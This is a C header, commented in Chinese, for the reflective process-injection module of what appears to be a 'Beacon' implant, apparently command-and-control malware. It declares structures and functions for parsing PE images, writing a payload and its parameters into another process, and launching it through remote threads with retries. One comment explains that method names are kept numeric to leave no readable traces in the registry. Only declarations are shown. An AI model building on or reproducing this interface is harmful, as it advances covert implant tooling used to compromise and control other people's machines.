#pragma once

#include "beacon_common.h"

/* 注入方法 ID：只保留数值标识，避免在注册表中引入可读方法名。 */
#define INJECT_METHOD_REFLECTIVE 1u

/* 注入准备请求：描述目标进程、载荷映像、可选参数块和入口导出。 */
typedef struct InjectRequest {
    UINT32 method;
    HANDLE process;
    const ByteBuf* image;
    const VOID* parameter;
    SIZE_T parameter_size;
    const CHAR* entry_export;
    WORD required_machine;
    const CHAR* image_label;
    const CHAR* parameter_label;
    const CHAR* invalid_request_error;
    const CHAR* missing_export_error;
} InjectRequest;

/* 注入准备结果：记录远程映像、远程参数块和最终线程入口地址。 */
typedef struct InjectResult {
    PVOID remote_image;
    SIZE_T remote_image_size;
    PVOID remote_parameter;
    SIZE_T remote_parameter_size;
    PVOID remote_entry;
} InjectResult;

/* 将 PE machine 常量转成项目内部使用的架构短名。 */
const CHAR* InjectMachineName(WORD machine);

/* 返回当前 Beacon 编译架构对应的 PE machine 常量。 */
WORD InjectCurrentMachine(VOID);

/* 将协议层传入的 arch 字符串映射为 PE machine 常量。 */
WORD InjectMachineFromArch(const CHAR* arch);

/* 将 PE RVA 转换为文件 raw offset，用于从未映射映像中定位目录/导出。 */
BOOL InjectRvaToRaw(PIMAGE_NT_HEADERS nt,
                    PIMAGE_SECTION_HEADER sections,
                    DWORD rva,
                    SIZE_T image_size,
                    DWORD* raw);

/* 校验内存中的 PE 映像并读取 FileHeader.Machine。 */
BOOL InjectImageMachine(const ByteBuf* image,
                        const CHAR* label,
                        WORD* machine,
                        CHAR* err,
                        SIZE_T err_size);

/* 在未映射 PE 映像中按导出名查找函数 raw offset。 */
BOOL InjectFindExportRawOffset(const BYTE8* image,
                               SIZE_T image_size,
                               const CHAR* export_name,
                               WORD required_machine,
                               DWORD* raw_offset);

/* 查询目标进程架构，用于避免跨架构注入。 */
BOOL InjectGetProcessMachine(HANDLE process,
                             const CHAR* label,
                             WORD* machine,
                             CHAR* err,
                             SIZE_T err_size);

/* 初始化 InjectResult，保证失败路径可安全清理。 */
VOID InjectResultInit(InjectResult* result);

/* 释放 InjectPrepare 分配到远程进程中的映像和参数块。 */
VOID InjectFreeRemote(HANDLE process, InjectResult* result);

/* 按 method 分发到具体注入准备实现，目前用于 reflective 映像准备。 */
BOOL InjectPrepare(const InjectRequest* req,
                   InjectResult* result,
                   CHAR* err,
                   SIZE_T err_size);

/* 非阻塞检查远程进程是否仍在运行，并输出简短状态。 */
BOOL InjectRemoteProcessAlive(HANDLE process,
                              CHAR* status,
                              SIZE_T status_size);

/* 创建远程线程；可配置重试次数，用于兼容短暂 ACCESS_DENIED 窗口。 */
BOOL InjectCreateRemoteThread(HANDLE process,
                              PVOID remote_entry,
                              PVOID thread_parameter,
                              UINT32 attempts,
                              DWORD retry_wait_ms,
                              const CHAR* invalid_request_error,
                              HANDLE* remote_thread,
                              CHAR* err,
                              SIZE_T err_size);
